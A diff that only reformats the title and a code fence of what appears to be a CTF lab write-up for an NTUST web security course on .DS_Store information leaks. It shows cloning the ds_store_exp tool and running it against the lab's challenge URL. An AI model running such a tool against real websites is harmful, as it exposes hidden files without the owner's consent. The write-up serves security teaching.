@@ -1,19 +1,19 @@
 ---
-title: Simple Web 0x02(Lab - `.DS_Store`)
+title: Simple Web 0x02(Lab - .DS_Store)
 tags: [NTUSTWS, CTF, Web]
 
 category: "Security Course｜NTUST WS｜Information Leak"
 date: 2023-01-31
 ---
 
-# Simple Web 0x02(Lab - `.DS_Store`)
+# Simple Web 0x02(Lab - .DS_Store)
 <!-- more -->
 ###### tags: `NTUSTWS` `CTF` `Web`
 Challenge: http://h4ck3r.quest:9001/
 
 ## Exploit - `.DS_Store`
 Clone  `lijiejie/ds_store_exp`
-```bash!
+```bash
 $ git clone https://github.com/lijiejie/ds_store_exp.git
 $ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store
 [200] http://h4ck3r.quest:9001/.DS_Store
